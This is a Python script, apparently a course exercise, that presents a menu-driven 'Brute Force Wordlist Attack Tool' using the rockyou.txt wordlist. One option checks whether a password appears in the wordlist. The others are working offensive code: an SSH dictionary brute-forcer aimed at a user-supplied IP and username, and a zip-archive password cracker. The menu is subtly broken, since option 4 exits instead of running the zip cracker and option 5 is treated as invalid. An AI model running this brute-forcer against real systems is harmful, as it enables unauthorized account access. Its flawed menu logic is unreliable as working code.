#!/usr/bin/python3

#Author: Steve Cherewaty
#Date: 05/22/2024
#Purpose: Brute Force III
#Sources: https://docs.python.org/3/library/zipfile.html
#https://www.howtoforge.com/how-to-protect-zip-file-with-password-on-ubuntu-1804/


import time
import paramiko
import getpass
import os 
from zipfile import ZipFile

def iterator():
# Prompt user for file path, default to 'rockyou.txt'
    filepath = input("Enter your dictionary filepath:\n") or "rockyou.txt"  

# Check if the file exists
    if not os.path.isfile(filepath):  
        print(f"File not found: {filepath}")  
        return  
    
    file = open(filepath, encoding="ISO-8859-1") 
 # Read the first line from the file
    line = file.readline() 
    while line:  
        line = line.rstrip()  
        word = line  
        print(word)  
        time.sleep(10)  
# Read the next line from the file
        line = file.readline()  
# Close the file
    file.close()  

def check_password():
    usr_password = getpass.getpass(prompt="Please enter a password: ") 
# Prompt user for file path, default to 'rockyou.txt' 
    usr_filepath = input("Checking the strength of that password.\nPlease enter a dictionary filepath:\n") or "rockyou.txt"  

    if not os.path.isfile(usr_filepath): 
        print(f"File not found: {usr_filepath}")  
        return  
    
    print(f"Checking password against the words in '{usr_filepath}', hang on for a sec.") 
    t1 = time.time()  
    file = open(usr_filepath, encoding="ISO-8859-1") 
    line = file.readline()  
    wordlist = []  
    while line:  
        line = line.rstrip()  
        word = line  
        wordlist.append(word)  
        line = file.readline()  
    file.close()  
    
 # Check if the password is not in the wordlist   
    if usr_password not in wordlist:  
        print("Your password is acceptable. Good job.")  
    else:
        print("Your password was found in the dictionary. Try again...you have 10 seconds...")  
    t2 = time.time()  
    # Print the duration of the check
    print(f"Password check completed in {t2 - t1:.2f} seconds.")  

def brute_force_ssh():
    ip = input("Enter the target IP address:\n")
    username = input("Enter the SSH username:\n")
    filepath = input("Enter your dictionary filepath:\n") or "rockyou.txt"
    
    if not os.path.isfile(filepath):
        print(f"File not found: {filepath}")
        return
    
    file = open(filepath, encoding="ISO-8859-1")
    line = file.readline()
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    while line:
        line = line.rstrip()
        password = line
        
        try:
            ssh.connect(ip, port=22, username=username, password=password, timeout=3)
            print(f"Success! Username: {username} Password: {password}")
            break
        except paramiko.AuthenticationException:
            print(f"Failed: {password}")
        except Exception as e:
            print(f"Connection error: {e}")
            break
        
        line = file.readline()
    
    file.close()
    ssh.close()
    
    
 #  Prompt user for path to zip file 
def extract_zip():
    zip_file = input("Enter the path of the zip file:\n")
    if not os.path.isfile(zip_file):
        print (f"FIle not found: {zip_file}")
        return
# Prompt usr for file path or rockyou
    dictionary_path = input("Enter your dictionary filepath:\n") or "rockyou.txt"
    if not os.path.isfile(dictionary_path):
        print(f"File not found: {dictionary_path}")
        return

    with ZipFile(zip_file) as zf:
        with open(dictionary_path, encoding="ISO-8859-1") as file:
            for line in file:
                password = line.strip()
                try:
                    zf.extractall(pwd=bytes(password, 'utf-8'))
                    print(f"Success! Password: {password}")
                    return
                except RuntimeError:
                    print(f"Failed: {password}")
                except Exception as e:
                    print(f"Error: {e}")
                    return
    print("No valid password found in the dictionary.")


# Main
if __name__ == "__main__":  
# Start an  loop
    while True:  
        print("\nBrute Force Wordlist Attack Tool Menu")  
        print("1 - Offensive, Dictionary Iterator")  
        print("2 - Defensive, Password Recognized")  
        print("3 - Offensive, SSH Brute Force") 
        print("4 - Offensive, Zip Brute Force ") 
        print("5 - Exit") 
         
# Get user input for menu option
        mode = input("Please enter a number: ")  
        
        if mode == "1":
            iterator()  
        elif mode == "2":
            check_password() 
        elif mode == "3":
            brute_force_ssh() 
        elif mode == "4":
            break  
        else:
            print("Invalid selection...") 
            
#  End